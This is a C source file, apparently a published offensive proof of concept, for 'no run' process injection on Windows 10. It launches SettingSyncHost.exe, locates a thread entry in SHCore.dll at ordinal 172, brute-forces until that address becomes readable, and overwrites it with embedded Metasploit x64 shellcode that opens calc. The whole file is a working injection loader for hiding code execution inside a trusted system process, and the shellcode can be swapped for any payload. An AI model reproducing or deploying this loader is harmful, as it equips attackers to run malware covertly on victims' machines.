/*

										@ORCx41 | ORCA
	No Run Process Injection :
		
		Since "SettingSyncHost.exe -Embedding" Runs a Thread On "SHCore.dll!Ordinal172+0x100", We can hijack the flow before this thread start
		to do that :
			
			- Load shcore.dll to calculate the thread's entry
			- Create "SettingSyncHost.exe -Embedding" Process
			- BruteForce the address calculated (stop when its valid)
			- suspend the process
			- inject the payload to the calculated address
			- resume the process
			- $$

									[ ~ Tested On W10 - 10.0.19044 ~ ]
*/

#include <Windows.h>
#include <stdio.h>

#define TARGET_PROCESS_NAME				L"SettingSyncHost.exe -Embedding"
#define ORDINAL172						172					
#define MAX_WAIT						2500
#define WAIT_TIME						0.1	



// metasploit x64 calc shellcode

unsigned char rawData[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};



BOOL CreateTargetProcess (PCWSTR szProcessName, PHANDLE hProcess, PDWORD dwProcessId) {
	
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	WCHAR wBuff[MAX_PATH * sizeof(WCHAR)];
	WCHAR wCmdLine[MAX_PATH * sizeof(WCHAR) * 2];

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));


	si.cb = sizeof(STARTUPINFOW);


	GetEnvironmentVariableW(L"windir", wBuff, MAX_PATH * sizeof(WCHAR));
	wsprintfW(wCmdLine, L"%s\\System32\\%s", wBuff, szProcessName);

	wprintf(L"[i] wCmdLine : %s\n", wCmdLine);
	

	if (!CreateProcessW(NULL, wCmdLine, NULL, NULL, FALSE, DETACHED_PROCESS | BELOW_NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		wprintf(L"[!] CreateProcessW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wprintf(L"[+] Target Process Created With Pid : %d\n", pi.dwProcessId);

	*hProcess	= pi.hProcess;
	*dwProcessId	= pi.dwProcessId;
	
	CloseHandle(pi.hThread);

	if (*hProcess == NULL || *dwProcessId == NULL)
		return FALSE;
	
	return TRUE;
}




BOOL InjectShellcodeAtOrdinal172(HANDLE hProcess, PVOID pAddress, PBYTE Shellcode, SIZE_T ShellcodeSize) {

	DWORD	lpOldProtection 	= NULL;
	SIZE_T	sNumberOfBytesWritten 	= NULL;


	if (!VirtualProtectEx(hProcess, pAddress, ShellcodeSize, PAGE_READWRITE, &lpOldProtection)) {
		wprintf(L"[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pAddress, Shellcode, ShellcodeSize, &sNumberOfBytesWritten)) {
		wprintf(L"[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, pAddress, ShellcodeSize, PAGE_EXECUTE_READWRITE, &lpOldProtection)) {
		wprintf(L"[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}



BOOL BruteForceAddress(HANDLE hProcess, PVOID pAddress) {

	PBYTE	lpBuffer				[MAX_PATH];
	SIZE_T	lpNumberOfBytesRead		= NULL,
			sCounter				= NULL;


	while (TRUE){

		if (ReadProcessMemory(hProcess, pAddress, lpBuffer, MAX_PATH, &lpNumberOfBytesRead)) {
			printf("[+] Brute Forcing Address : 0x%p Succeeded After : %ld Tries \n", pAddress, sCounter);
			return TRUE;
		}

		// when the address does not exist yet, keep running 
		if (GetLastError() == ERROR_PARTIAL_COPY) {			
			WaitForInputIdle(hProcess, WAIT_TIME);
			sCounter++;
			if (sCounter > MAX_WAIT) {
				// timeout
				break;
			}
			continue;
		}
		// if the error was something else
		else{
			wprintf(L"[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
			break;
		}

	}

	return FALSE;
}




int main() {


	HANDLE	hProcess		= NULL;
	DWORD	dwProcessId		= NULL;
	HMODULE hModule			= NULL;
	PVOID	pAddress		= NULL;

	

	if ((hModule = LoadLibraryA("SHCORE.DLL")) == NULL) {
		wprintf(L"[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return -1;
	}

	if ((pAddress = GetProcAddress(hModule, (CHAR*)((ULONGLONG)ORDINAL172 & 0xFFFF))) == NULL) {
		wprintf(L"[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return -1;
	}
	

	printf("[i] SHCore.dll!Ordinal#172 : 0x%p \n", pAddress);
	
	pAddress = (ULONG_PTR)pAddress + 0x100;

	printf("[i] SHCore.dll!Ordinal#172+0x100 : 0x%p [SHOULD BE THREAD ENTRY]\n", pAddress);


	if (!CreateTargetProcess(TARGET_PROCESS_NAME, &hProcess, &dwProcessId)) {
		return -1;
	}

	if (!BruteForceAddress(hProcess, pAddress)) {
		printf("[!] BruteForce Failed Or Timed Out\n");
		return -1;
	}

	DebugActiveProcess(dwProcessId);

	if (!InjectShellcodeAtOrdinal172(hProcess, pAddress, rawData, sizeof(rawData))) {
		return -1;
	}

	printf("[+] Payload Injected To 0x%p \n", pAddress);
	
	DebugActiveProcessStop(dwProcessId);


	system("PAUSE");
	TerminateProcess(hProcess, 0);
	return 0;
}


